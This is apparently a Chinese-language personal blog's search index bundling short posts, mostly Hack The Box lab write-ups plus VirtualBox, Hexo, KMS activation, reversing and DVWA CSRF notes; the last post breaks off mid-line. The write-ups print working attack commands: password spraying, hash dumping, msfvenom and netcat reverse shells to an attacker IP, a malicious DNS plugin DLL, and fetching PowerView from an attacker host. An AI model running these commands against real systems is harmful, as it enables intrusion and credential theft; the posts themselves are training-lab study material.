{"pages":[],"posts":[{"title":"20231231-virtualbox-additions","text":"virtualbox install additions toolvirtualbox手动安装增强工具. 确定virtualbox版本 1vboxmanage --version 下载对应版本增强工具VBoxGuestAdditions_X.Y.Z.iso VBoxGuestAdditions下载地址 index of 将iso镜像挂载到虚拟机中 启动虚拟机，打开CD驱动器，安装对应版本增强工具","link":"/20231231-virtualbox-additions/"},{"title":"20240115-burpsuite-intercept-rules","text":"burpsuite-intercept-rulesref: burpsuite-proxy去除无用的流量抓包 针对火狐、google浏览器在burp做截断时出现的噪声流量,添加过滤规则。 1(mozilla.com$|firefox.com$|firefoxchina.cn$|shodan.io$|mozilla.org$|firefox.com.cn$|mozilla.net$|microsoft.com$|bing.net$|live.com$|bing.com$|cnblog.com$) 将以上规则添加到Proxy-Settings - Request Interception Rules","link":"/20240115-burpsuite-intercept-rules/"},{"title":"Hexo+ICARUS博客搭建","text":"Hexo 安装安装 NodejsHexo 安装 使用 yarn (或 npm) 1yarn global add hexo-cli 在自己选定的目录下 （例如 ./BlogTest 目录下) 1hexo init 根据Hexo 中文配置教程设置自己的站点信息 title subtitle description author language timezone trailing_index trailing_html updated_option per_page 使用Hexo 中文命令教程构建、预览博客 使用 git 管理备份项目（非 GitHub Pages) 在 GitHub 创建空白项目 克隆到本地目录中(例如 Blog) 将 BlogTest 目录下所有内容(BlogTest/*)拷贝至 Blog 目录下 ICARUS 主题安装 在 Blog 目录下,使用以下命令设置 git 子模块，以此种方式将 Icarus 主题克隆至 themes/icarus 目录下 1git submodule add https://github.com/ppoffice/hexo-theme-icarus.git themes/icarus 在 Hexo 的_config.yml 文件中开启 Icarus 1theme: icarus 运行 Hexo 命令根据提示安装未安装的模块","link":"/create_blogs_with_hexo_icarus/"},{"title":"hack the box 0x01","text":"Hack The Box注册了hack the box,跟随Start point，得到了第一台机器(Meow)最终的flag,竟然非 常喜悦。 使用 nmap扫描端口，获得23端口存活，服务是telnet。使用 metasploit的 telnet_login模块，暴破了用户/密码(root/root)。 总结步骤 nmap端口扫描 使用nmap扫描端口，获得信息。 metasploit工具暴破 根据获得的信息，选择对应工具。","link":"/hack-the-box-0x01/"},{"title":"hackthebox-220-resolute","text":"hackthebox resoluteresolute port scan使用rustscan做端口扫描，发现存在139,445,389等端口开放。 services使用windapsearch对ldap服务进行枚举,枚举用户、组、以及全量信息。 123456789mod=&quot;users&quot;; windapsearch --dc '10.10.10.169' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;mod=&quot;user-spns&quot;; windapsearch --dc '10.10.10.169' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;mod=&quot;privileged-users&quot;; windapsearch --dc '10.10.10.169' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;mod=&quot;metadata&quot;; windapsearch --dc '10.10.10.169' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;mod=&quot;groups&quot;; windapsearch --dc '10.10.10.169' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;mod=&quot;domain-admins&quot;; windapsearch --dc '10.10.10.169' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;mod=&quot;computers&quot;; windapsearch --dc '10.10.10.169' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;windapsearch --dc '10.10.10.169' -u '' -p '' --full -m &quot;custom&quot; --filter &quot;(&amp;(objectClass=*))&quot; | tee custom.all.txt 对检索出的信息，进行过滤查看，以常见关键词进行过滤，发现Account description中存在密码Welcome123!。 1cat custom.all.txt | rg -iaP &quot;((pass)|(pwd)|(cred)|(desc))&quot; | rg -ivP &quot;((badpwdcount)|(badpasswordtime)|(pwdlastset))&quot; | rg -iaP &quot;((pass)|(pwd)|(cred)|(desc))&quot; 发现密码后，根据密码找到此密码对应到哪个用户。 1cat custom.all.txt | rg -B7 -A30 -iaP &quot;welcome123&quot; 找到marko / Welcome123!凭据。根据此凭据先尝试登录(不成功)，使用cme查看密码策略, 发现没有设置锁定策略。 1cme smb '10.10.10.169' -u '' -p '' --pass-pol 没有密码锁定策略，可以尝试密码喷洒, 得到可登录凭据melanie / Welcome123!。 1cme smb '10.10.10.169' -u './megabank.local.users.txt' -p 'Welcome123!' --continue-on-success foothold使用evil-winrm以melanie / Welcome123!凭据登录目标。 priv esca一番枚举后，发现根目录下存在隐藏目录PSTranscripts，其中存在pwsh 执行历史记录,包含登录凭据。 在pwsh历史记录中，发现ryan的凭据ryan / Serv3r4Admin4cc123!。 尝试使用ryan / Serv3r4Admin4cc123!登录winrm(成功),可以再次尝试密码喷洒。 一番枚举，发现ryan用户归属于DnsAdmins组，因此可以尝试添加Dns plugin的方式，使得恶意插件启动，从而提升权限。 参照esca priv with dnsadmins group active direcotry文章， 制作dns恶意插件，由于启动进程后，执行反弹shell连接，会导致插件停止继续运行，shell不稳定，可以使用多线程编程，可以使得 reverse shell在单独的线程中，不会影响dns服务运行，导致服务异常停止,shell不稳定。 根据dim0x69/dns-exe-persistance插件模板，以及cpp rev shell 制作恶意dns plugin. 监听对应端口，等待反弹shell. 启动smb share, 托管恶意插件，然后在目标机器安装插件，并重启dns服务，让插件启动,应该可以得到反弹shell. 执行命令，加载dns plugin,并重启dns服务。 1dnscmd resolute.megabank.local /config /serverlevelplugindll \\\\10.10.14.22\\share\\dnsAplugin.dll; sc.exe stop dns; sc.exe start dns; 监听端口处，得到反弹administrator shell,由于目标是域控，则得到了域管权限. post尝试使用impacket-secretsdump获取所有域用户的凭据。","link":"/hackthebox-220-resolute/"},{"title":"hackthebox-cascade-235","text":"hackthebox cascadecascade port scan使用rustscan做端口扫描，存在开放端口139,445,389,5985等。 services使用windapsearch枚举389 ldap服务，枚举users,groups,computers以及custom all信息。 123456mod=&quot;users&quot;; windapsearch --dc '10.10.10.182' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;mod=&quot;groups&quot;; windapsearch --dc '10.10.10.182' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;mod=&quot;computers&quot;; windapsearch --dc '10.10.10.182' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;mod=&quot;metadata&quot;; windapsearch --dc '10.10.10.182' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;mod=&quot;custom&quot;; windapsearch --dc '10.10.10.182' -u '' -p '' --full -m &quot;${mod}&quot; --filter &quot;(&amp;(objectClass=*))&quot; | tee custom.allObject.txt 过滤查看查询到的信息，发现存在cascadeLegacyPwd字样，保存着r.thompson的密码。 使用cme根据r.thompson / rY4n5eva凭据尝试登录smb服务，获得共享目录列表(登录成功)。 1cme smb '10.10.10.182' -u 'r.thompson' -p 'rY4n5eva' --shares 可以使用cme查看用户密码策略后，尝试密码喷洒(常规步骤，仅做记录)。 1cme smb '10.10.10.182' -u 'r.thompson' -p 'rY4n5eva' --pass-pol 发现未设置密码锁定次数，则可以密码喷洒，不会锁定账户。未发现其他成果。 1cme smb '10.10.10.182' -u './cascade.local.users.lst' -p 'rY4n5eva' --continue-on-success 使用cme的spider_plus模块爬取smb 共享文件信息。 1cme smb '10.10.10.182' -u 'r.thompson' -p 'rY4n5eva' -M spider_plus 查看这些文件内容，汇总以下信息： 有一个TempAdmin账户，已经被删除，与管理员账户密码相同 存在一个s.smith账户，它有VNC安装密码hex形式: hex:6b,cf,2a,4b,6e,5a,ca,0f 存在一个ArkSvc账户，此账户做删除操作，此账户删除了TempAdmin账户 根据frizb/PasswordDecrypts文档说明，恢复hex形式的VNC密码。 12# Native Linux Toolsecho -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv 使用cme，以s.smith / sT333ve2 尝试登录smb, winrm, 登录成功时使用spider_plus模块搜集共享文件信息;(标准动作:尝试密码喷洒) 1234cme smb '10.10.10.182' -u 's.smith' -p 'sT333ve2' --sharescme winrm '10.10.10.182' -u 's.smith' -p 'sT333ve2'cme smb '10.10.10.182' -u 's.smith' -p 'sT333ve2' -M spider_plus footholdwirm能够登录，使用evil-winrm登录，获得交互式pwsh shell. 1evil-winrm -i '10.10.10.182' -u 's.smith' -p 'sT333ve2' priv esca发现s.smith可读共享目录Audit$下，存在一些二进制文件和sqllite数据库文件Audit.db. 查看Audit.db数据库中数据,发现ArkSvc密码(加密) BQO5l5Kj9MdErXx6Q6AGOw==, 使用dnspy对CascAudit.exe做逆向，发现需要引入CascCrypto.dll，引入后发现， 此二进制文件的功能是与sqllite数据库交互查询ArkSvc用户的密码后解密，再做其他操作。 解密方法是CascCrypto.dll链接库中的 public static string DecryptString(string EncryptedString, string Key)方法。 Key是c4scadek3y654321，ArkSvc的加密密码是BQO5l5Kj9MdErXx6Q6AGOw== 。 尝试新建C#控制台程序，debug此方法，手动解密密码, 密码是w3lc0meFr31nd。 使用cme以ArkSvc / w3lc0meFr31nd凭据登录smb,winrm. 1234cme smb '10.10.10.182' -u 'ArkSvc' -p 'w3lc0meFr31nd'cme winrm '10.10.10.182' -u 'ArkSvc' -p 'w3lc0meFr31nd'evil-winrm -i '10.10.10.182' -u 'ArkSvc' -p 'w3lc0meFr31nd' 枚举到ArkSvc用户在AD Recycle Bin组中，与之前收集的信息符合，引入pwsh的ActiveDirectory模块， 调用Get-ADObject方法查询，Recycle Bin中已经删除的对象属性。 123Import-Module ActiveDirectoryGet-ADObject -SearchBase &quot;CN=Deleted Objects,DC=Cascade,DC=local&quot; -Filter {ObjectClass -eq &quot;user&quot;} -IncludeDeletedObjects -Properties * 得到TempAdmin / baCT3r1aN00dles 凭据。之前收集到的信息TempAdmin密码与普通管理员密码相同，尝试密码喷洒。 123impacket-GetADUsers -all -dc-ip '10.10.10.182' 'cascade.local/ArkSvc:w3lc0meFr31nd' | tail -n+6 | awk '{print $1}' | tee ../../dump/cascade.local.users.txtcme smb '10.10.10.182' -u './cascade.local.users.txt' -p 'baCT3r1aN00dles' --continue-on-success 喷洒到administrator / baCT3r1aN00dles，与之前掌握的信息符合,(密码喷洒容易触发主机防护告警)。 使用evil-winrm以administrator / baCT3r1aN00dles凭据登录winrm服务。 postimpacket-secretsdump将域内所有用户hash dump到本地。 1impacket-secretsdump -outputfile 'cascade.local.secretsdump.txt' -dc-ip '10.10.10.182' -target-ip '10.10.10.182' 'cascade.local/administrator:baCT3r1aN00dles@10.10.10.182'","link":"/hackthebox-cascade-235/"},{"title":"hackthebox-forest-202","text":"hackthebox forestforest port scan使用rustscan扫描后，开放端口有389,139,445等。 services使用windapsearch对ldap服务进行枚举 1234567891011# 检索所有信息windapsearch --dc '10.10.10.161' -u '' -p '' --full -m custom --filter &quot;(&amp;(objectclass=*))&quot; | tee custom.allobj.txt# 检索用户信息mod=&quot;users&quot;; windapsearch --dc '10.10.10.161' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;# 检索组信息mod=&quot;groups&quot;;windapsearch --dc '10.10.10.161' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot;# 检索电脑信息mod=&quot;computers&quot;;windapsearch --dc '10.10.10.161' -u '' -p '' --full -m &quot;${mod}&quot; | tee &quot;${mod}.txt&quot; 过滤检索信息输出中的用户名 1cat users.txt | rg -iaoP &quot;(?&lt;=samaccountname:\\s).+$&quot; | sort | uniq | sort | rg -ivP &quot;((healthmailbox)|(defaultaccount)|(331000)|(sm_.+))&quot; | tee ../0817-forest.htb.local.users.txt 使用impacket-GetADUsers脚本进行ldap检索 1impacket-GetADUsers -all -no-pass -dc-ip '10.10.10.161' 'htb.local/' | tee ../0817-getADUsers.impacket.txt 过滤检索出的ADUsers结果 1cat ../0817-getADUsers.impacket.txt | tail -n+6 | awk '{print $1}' | rg -ivP &quot;((guest)|(331000)|(krbtgt)|(sm_.+$)|(healthmailbox)|(defaultaccount))&quot; | tee ../0817-getADUsers.impacket.username.txt 使用impacket-GetNPUsers尝试根据用户名，获取用户AS-REP hash 123cat 0817-getADUsers.impacket.username.txt 0817-forest.htb.local.users.txt | sort | uniq | sort | tee 0817.forest.htb.username.lsimpacket-GetNPUsers -dc-ip '10.10.10.161' -no-pass -usersfile './0817.forest.htb.username.lst' -outputfile '0817-htb.local.GetNpUsers.txt' 'htb.local/' 使用john爆破svc-alfresco用户的AS-REP 1john-Rockyou ./0817-htb.local.GetNpUsers.txt 获得用户登录凭据svc-alfresco / s3rvice foothold使用evil-winrm工具，凭借已知svc-alfresco / s3rvice凭据尝试登录,登录成功。 123evil-winrm -i '10.10.10.161' -u 'svc-alfresco' -p 's3rvice'*Evil-WinRM* PS&gt; whoami ; hostname ; type user.txt ; ipconfig /all priv esca在svc-alfresco用户交互shell中，进行信息枚举,发现svc-alfresco用户在Account Operators用户组中。此用户组存在DCSync攻击可能。 12345# 将evil-winrm bypassBypass-4MSI# 导入PowerView模块iex(New-Object Net.WebClient).downloadString('http://10.10.14.22/0-bin/PowerView.ps1') Account Operators Exchange DCSync攻击步骤 1234# 添加一个domain用户 gvestnet user gvest p@ssw3rd135246 /add /domainnet group &quot;Exchange Windows Permissions&quot; gvest /addnet localgroup &quot;Remote Management Users&quot; gvest /add 1234# 给添加的gvest添加DCSync权限$pass = ConvertTo-SecureString 'p@ssw3rd135246' -AsPlain -Force$cred = New-Object System.Management.Automation.PSCredential('htb\\gvest', $pass)Add-ObjectACL -PrincipalIdentity gvest -Credential $cred -Rights DCSync 使用impacket-secretdump以添加的gvest用户dump hash值 1impacket-secretsdump -outputfile '0817-forest.htb.local' -dc-ip '10.10.10.161' -target-ip '10.10.10.161' 'htb.local/gvest:p@ssw3rd135246@10.10.10.161' 使用Administrator的hash尝试登录evil-winrm 1evil-winrm -i '10.10.10.161' -u 'administrator' -H '32693XXXXXXXXeea6' post已经使用impacket-secretsdump dump了所有hash, 可以尝试添加后门域管用户。","link":"/hackthebox-forest-202/"},{"title":"hackthebox-return-401","text":"hackthebox returnreturn port scan使用rustscan 扫描目标地址后发现多个端口开放，其中80是http服务。使用gobuster目录爆破，发现 http://10.10.11.108/settings.php链接. servicessettings.php页面上发现有保存的ldap用户名. 点击update按钮触发post请求,请求体中有ip字段,值为目标域名printer.return.local。 foothold将请求体中的ip换成自己机器的ip，并且使用responder监听ldap服务. 使用burp 修改settings.php 请求. 发送请求后,responder处得到目标机器发起的ldap认证信息(用户名/密码); 使用evil-winrm使用ldap用户信息尝试登录:登录成功。 priv esca枚举信息，发现svc-printer用户在用户组(Server Operators group)中， 根据文档 显示此用户组成员具有以交互方式登录服务器、创建和删除网络共享资源、启动和停止服务、备份和还原文件、格式化计算机的硬盘驱动器以及关闭服务器 。 因为它具有启动/停止服务的权限，尝试使用sc.exe create ...创建服务失败后，使用修改常见服务的方式执行恶意文件。 准备恶意文件 nc.exe即可，这里使用msf payload 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=9002 EXITFUNC=thread -e x86/shikata_ga_nai -i 10 -f exe -o rev.exe msf 监听payload 使用multi/handler监听对应payload; 服务启动后大约持续5s，即会停止进程;防止连接关闭，设置msf自动migrate进程。 1234567use multi/handlerset payload windows/meterpreter/reverse_tcpset EXITFUNC threadset lhost 10.10.14.22set lport 9002set ExitOnSession falseset AutoRunScript post/windows/manage/migrate 执行msf payload 通过evil-winrm的 upload方法上传恶意文件,然后修改vss(卷影复制服务,Volume Shadow Copy Service)。 12345# 设置vss服务 可执行文件路径为 msf payload pathsc.exe config vss binpath= &quot;C:\\windows\\tasks\\rev.exe&quot;# 重启vss服务sc.exe stop vss ; sc.exe start vss post使用msf的post/windows/gather/smart_hashdump模块，执行后利用，dump 用户密码hash. other func不使用msf payload,使用普通nc.exe. 1234# 修改vss可执行文件路径位置 并 提供执行参数sc.exe config vss binpath= &quot;C:\\windows\\tasks\\nc.exe -e cmd.exe 10.10.14.22 9002&quot;sc.exe stop vss; sc.exe start vss 得到nc反弹shell后，立刻在此shell中再使用nc.exe创建另一个稳定反弹shell. 1C:\\windows\\tasks\\nc.exe -e cmd.exe 10.10.14.22 9003","link":"/hackthebox-return-401/"},{"title":"hackthebox-sauna-229","text":"hackthebox saunasauna port scan使用rustscan做端口扫描，发现开放了80,139,445,369等端口； services使用gobuster对80http服务进行路径爆破。 发现存在以下路径: http://10.10.10.175/Contact.html (Status: 200) [Size: 15634] http://10.10.10.175/Blog.html (Status: 200) [Size: 24695] http://10.10.10.175/Index.html (Status: 200) [Size: 32797] http://10.10.10.175/Images (Status: 403) [Size: 1233] http://10.10.10.175/About.html (Status: 200) [Size: 30954] http://10.10.10.175/about.html (Status: 200) [Size: 30954] http://10.10.10.175/blog.html (Status: 200) [Size: 24695] http://10.10.10.175/contact.html (Status: 200) [Size: 15634] http://10.10.10.175/css (Status: 403) [Size: 1233] http://10.10.10.175/fonts (Status: 403) [Size: 1233] http://10.10.10.175/index.html (Status: 200) [Size: 32797] http://10.10.10.175/index.html (Status: 200) [Size: 32797] http://10.10.10.175/images (Status: 403) [Size: 1233] http://10.10.10.175/single.html (Status: 200) [Size: 38059] 在about页面收集员工姓名列表，如下: Fergus Smith Shaun Coins Sophie Driver Bowie Taylor Hugo Bear Steven Kerb 使用username-anarchy对已知姓名进行用户名列表输出。 1./username-anarchy -i /root/labs/01-htb/010-active-directory/sauna/dump/username.http.lst | tee /root/labs/01-htb/010-active-directory/sauna/dump/username-anarchy.lst 使用impacket-GetNPUsers尝试获取指定用户名的AS-REP 1impacket-GetNPUsers -request -outputfile './0818-egotistical-bank.local.txt' -format john -usersfile './username-anarchy.lst' -no-pass -dc-ip '10.10.10.175' 'egotistical-bank.local/' 使用john对获得的hash进行爆破. 1john-Rockyou ./0818-egotistical-bank.local.txt 爆破得到凭据fsmith / Thestrokes23 使用cme以fsmith / Thestrokes23凭据获得用户密码策略，查看能否尝试密码喷洒，而不会锁定账号。 1cme smb '10.10.10.175' -u 'fsmith' -p 'Thestrokes23' --pass-pol Account Lockout Threshold: None:账户锁定前可尝试次数，未定义即为：不会锁定账户；可放心喷洒。 使用cme将已知密码和用户列表进行喷洒。 1cme smb '10.10.10.175' -u './egotistical-bank.local.username.lst' -p 'Thestrokes23' --continue-on-success 可得到hsmith / Thestrokes23 (常规动作，仅做记录) 可尝试根据Thestrokes23后两位数字规则，使用john生成对应规则密码字典。 在/etc/john/john.conf的[List.Rules:All]配置段落后添加自定义规则。 再使用john以新规则生成字典。 1john --wordlist=./pass.org --rule=append2nu --stdout | tee thestrokes.pass.lst 再使用hydra,cme等工具进行密码爆破。未发现成功结果。 foothold使用evil-winrm以fsmith / Thestrokes23凭据尝试登录winrm. 1evil-winrm -i '10.10.10.175' -u 'fsmith' -p 'Thestrokes23' priv esca以fsmith用户枚举信息。 查询注册表HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon，以确定保存的自动登录用户凭据。 1reg.exe query 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' 查询到svc_loanmanager / Moneymakestheworldgoround!，根据额外枚举到的用户信息，用户名应该是svc_loanmgr svc_loanmgr用户属于Remote Management User用户组，使用 svc_loanmgr / Moneymakestheworldgoround! 凭据尝试登录wirm. 使用bloodhound工具以svc_loanmgr用户身份，导出域内关系图，发现svc_loanmgr具有DCSync攻击路径。 1bloodhound-python -c 'all' -d 'egotistical-bank.local' -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -ns '10.10.10.175' -dc 'sauna.egotistical-bank.local' -gc 'sauna.egotistical-bank.local' --zip 使用Find Principals with DCSync Rights查询语句查询所有具有DCSync权限的用户. 使用impacket-secretsdump以svc_loanmgr凭据dump整个域内用户的hash. 1impacket-secretsdump -dc-ip '10.10.10.175' -target-ip '10.10.10.175' 'egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175' 得到administrator的hash后，可以使用evil-winrm做pass-the-hash进行登录。 post域内用户hash已经dump，可以尝试添加后门域管用户。 other func提权做信息收集时，可以使用peass进行自动收集,同样可以收集到autologon credentials。","link":"/hackthebox-sauna-229/"},{"title":"htb-swagshop","text":"HTB-SwagShopofficial htb walkthrough中的exploit已经被打上补丁。 参照https://0xrick.github.io/hack-the-box/swagshop/可以正常使用。 为触发reverse-shell，在创建Newsletter Templates时， 添加{{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}} 语句时，需要手动Hide Editor将代码模式调整为html，否则，会自动渲染为 {{&lt;code&gt;block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'&lt;/code&gt;}}。 导致将代码当成普通文本渲染，而不是执行，无法载入上传的shell.php.png。","link":"/htb-swagshop/"},{"title":"openwrt-kms-active-win-office","text":"openwrt KMS服务器激活windows与office参考破浪: Openwrt的KMS服务，激活windows和office 激活过程: 在需要激活的机器上设置好KMS服务器的地址，让机器使用windows自身的激活机制进行激活。 先决条件: 安装的windows镜像、office镜像版本都是批量授权版(VOL)，而不是零售版(Retail)。 区别就是批量授权版类似于供应企业使用，为了方便企业激活，允许使用KMS服务器批量激活。 Openwrt esir 高大全固件默认存在KMS服务器服务，开启即可。 windows激活MS 官方 各版本镜像下载 ; 开启开发者工具后， 将屏幕设备修改为移动设备，即可以直接下载。 windows激活过程，按照步骤执行激活过程即可。 给需要激活机器先卸载已存在密钥 1slmgr /upk 给需要激活机器安装对应版本密钥 12# 专业工作站版密钥slmgr /ipk NRG8B-VKK3Q-CXVCJ-9G2XF-6Q84J esir Openwrt 固件KMS服务器配置文件中提供的几个版本的Key #Windows 10/ Windows 11 KMS 安装激活密钥 #Windows 10/11 Pro：W269N-WFGWX-YVC9B-4J6C9-T83GX #Windows 10/11 Enterprise：NPPR9-FWDCX-D2C8J-H872K-2YT43 #Windows 10/11 Pro for Workstations：NRG8B-VKK3Q-CXVCJ-9G2XF-6Q84J 给需要激活的机器设置KMS服务器地址 12# openwrt ip地址slmgr /skms 192.168.5.1 12# 确认KMS服务器地址已经正常设置, 解析结果为 192.168.5.1nslookup -type=srv _vlmcs._tcp.lan 执行手动激活 1slmgr /ato office 激活一定要安装VOL版本office，否则激活不成功，可能有解决办法破浪: Openwrt的KMS服务，激活windows和office, 但是很麻烦。 安装VOL版本office参照祕技: 安装部署Microsoft Office LTSC 专业增强版 2021 ，使用官方office Office部署工具(Office Deployment Tool), 进行office Vol各版本office手动安装部署。 下载office deployment tool https://www.microsoft.com/en-us/download/details.aspx?id=49117 运行office deployment tool 创建一个空文件夹(例如名称为: office_file)，在运行office deployment tool后，选择这个空文件夹。(整个安装过程完成后，此文件夹可以删除) 运行完成后，文件夹下会生成几个office安装描述xml配置文件，和setup.exe。删除生成的几个xml配置文件。 生成需要安装的对应版本office描述xml配置文件 在MS office 官方xml配置文件生成网站中生成xml配置文件，然后下载到office_file中。 例如Office LTSC 专业增强版xml如下: 包含Visio LTSC专业版、Project LTSC专业版 office_LTSC_pro_plus_2021.xml1234567891011121314151617181920212223&lt;Configuration ID=&quot;0120b23a-3fdc-43ad-8f91-84dffbff66de&quot;&gt; &lt;Add OfficeClientEdition=&quot;64&quot; Channel=&quot;PerpetualVL2021&quot;&gt; &lt;Product ID=&quot;ProPlus2021Volume&quot; PIDKEY=&quot;FXYTK-NJJ8C-GB6DW-3DYQT-6F7TH&quot;&gt; &lt;Language ID=&quot;zh-cn&quot; /&gt; &lt;ExcludeApp ID=&quot;Lync&quot; /&gt; &lt;/Product&gt; &lt;Product ID=&quot;VisioPro2021Volume&quot; PIDKEY=&quot;KNH8D-FGHT4-T8RK3-CTDYJ-K2HT4&quot;&gt; &lt;Language ID=&quot;zh-cn&quot; /&gt; &lt;ExcludeApp ID=&quot;Lync&quot; /&gt; &lt;/Product&gt; &lt;Product ID=&quot;ProjectPro2021Volume&quot; PIDKEY=&quot;FTNWT-C6WBT-8HMGF-K9PRX-QV9H8&quot;&gt; &lt;Language ID=&quot;zh-cn&quot; /&gt; &lt;ExcludeApp ID=&quot;Lync&quot; /&gt; &lt;/Product&gt; &lt;/Add&gt; &lt;Property Name=&quot;SharedComputerLicensing&quot; Value=&quot;0&quot; /&gt; &lt;Property Name=&quot;FORCEAPPSHUTDOWN&quot; Value=&quot;FALSE&quot; /&gt; &lt;Property Name=&quot;DeviceBasedLicensing&quot; Value=&quot;0&quot; /&gt; &lt;Property Name=&quot;SCLCacheOverride&quot; Value=&quot;0&quot; /&gt; &lt;Property Name=&quot;AUTOACTIVATE&quot; Value=&quot;1&quot; /&gt; &lt;Updates Enabled=&quot;TRUE&quot; /&gt; &lt;RemoveMSI /&gt;&lt;/Configuration&gt; 使用setup.exe按配置文件下载office安装数据 1234# 进入setup.exe所在目录cd office_filePS C:\\Users\\xxx\\office_file&gt; .\\setup.exe /download &quot;.\\office_LTSC_pro_plus_2021.xml&quot; 命令完成后，office_file目录下存在下载完成的office 数据。 使用setup.exe对已经下载的office安装数据进行配置安装 1234# 进入setup.exe所在目录cd office_filePS C:\\Users\\xxx\\office_file&gt; .\\setup.exe /configure &quot;.\\office_LTSC_pro_plus_2021.xml&quot; 命令完成后，office已经安装完毕,将各office组件，都打开一遍，准备激活。 office KMS服务器激活 进入到office安装目录下 12# Office15, Office16PS &gt; cd 'C:\\program files\\microsoft office\\Office16' 使用官方ospp.vbs脚本设置KMS服务器地址 12# openwrt地址 192.168.5.1PS C:\\program files\\microsoft office\\Office16&gt; cscript ospp.vbs /sethst:192.168.5.1 使用官方ospp.vbs脚本手动执行激活 1PS C:\\program files\\microsoft office\\Office16&gt; cscript ospp.vbs /act 使用官方ospp.vbs脚本查看office安装key、激活状态 1PS C:\\program files\\microsoft office\\Office16&gt; cscript ospp.vbs /dstatus","link":"/openwrt-kms-active-win-office/"},{"title":"reversing-enging 0x00","text":"Tools file ghidra strings ltrace 1ltrace ./cmd gdb with plugin pwndbg info i b info break,查看所有断点信息 i r info registers,查看各寄存器当前值 i f info function,查看所有函数名 show show args 查看参数 backtrace 查看调用栈 执行 run r 重新开始执行 s 源码层面step into，一步 si 汇编层面step into,一步 n 源码层面step over，一步 ni 源码层面step over，一步 c continue; continue step debug starti 自动run后断在程序入口处 piebase 计算当前程序运行地址 piebase 0x1234 计算当前程序运行地址+偏移量后的地址 断点 break *0x1234 给0x1234地址处的指令打断点,*作取地址意 break +0x1234 在当前位置下0x1234的位置打断点 breakrva 0x1234 跟据piebase与0x1234偏移量设置断点 delete 1 删除1号断点;delete为删除所有断点 disable 2 禁用2号断点; enable 2为启用2号断点 clear 清除之后所有断点 jump *0x1234 跳跃执行0x1234处的程序 缓冲区溢出相关 依赖pwntools。 cyclic 200 生成200位溢出字符 cyclic -l ‘AwAA’ 计算栈溢出偏移量 r2 aka. radare2 aa analyze all afl show functions s main select main function. pdf print selected function’s debug info","link":"/reversing-enging-0x00/"},{"title":"reversing-enging-0x01","text":"buffer overflowHTB:You know 0xDiablos:bof. Linux x86 内存结构 一个函数被调用时，传递给此函数的参数(name-parameter)以及此函数的局部变量会被push到stack段的 栈顶。 当一个函数有多个入参时，会倒序push到stack段中，如funcA(1, 2, 3)，会以 push(3);push(2);push(1)的方式push到stack中。 调用的函数(A)入栈后，应该持有一个地址，用于函数(A)执行完成后，继续运行的下一行 代码的地址(return address)。 全部内容入栈后，会将栈底指针EBP(extended base pointer)入栈,说明当前位置是栈底 。此处栈底的定义是针对入栈后正在运行的函数(A)而言的，因为，函数(A)的内部变量 也需要入栈，入的是以EBP为底的栈。 举例理解123456void main() {1 char buffer [256];2 funcA(1, 2, 3);3 otherStatement;4 return;} 当以上程序 执行1行时，buffer入栈。 执行2行时，作为入参(name-parameter):3入栈、2入栈、1 入栈;作为返回地址 (return address),下一行代码(3行)的地址入栈。 funcA函数相关信息入栈完毕，EBP入栈,标识此处是栈底。 椄下来是funcA内部变量，会以EBP作为栈底，入栈。 比较特殊的是，main函数的入参在kernel段中，而不是stack段。 缓冲区溢出攻击过程buffer溢出攻击过程就是栈溢出攻击过程。buffer在填充的时候，由低地址向高地址 填充。 buffer填充过量(溢出)，就是栈溢出，当人为控制溢出的内容时，就是缓冲区溢出攻击。 根据以上图，funcA执行完毕后，根据return address与name-parameter执行bad func了，而不是预计的funcA 的3行，这就是缓冲区溢出攻击。","link":"/reversing-enging-0x01/"},{"title":"something about DVWA - CSRF","text":"DVWADVWA =&gt; 备份地址 CSRF(跨站请求伪造)跨站请求伪造(Cross-site request forgery),也被称作one-click attack。 用来挟持用户在当前已登录的Web应用程序上执行非本意的操作。 CSRF访问原理: Low 手工测试 直接在已经登录成功，身份认证未失效的浏览器上访问以下url即可更改当前用户的密码。 1http://train.com/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change# 源码分析 直接从request中获取参数 123// Get input$pass_new = $_GET[ 'password_new' ];$pass_conf = $_GET[ 'password_conf' ]; 新密码与确认密码相同即更新数据库 使用mysqli_real_escape_string函数转义特殊字符，防止sql注入。 然后将密码使用md5加密后入库。 123# 转义特殊字符$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$pass_new = md5( $pass_new ); Medium 手工测试 与Low级别相同。 不同的是构造的http请求需要包含Referer字段,用来验证url来源。 1Referer: 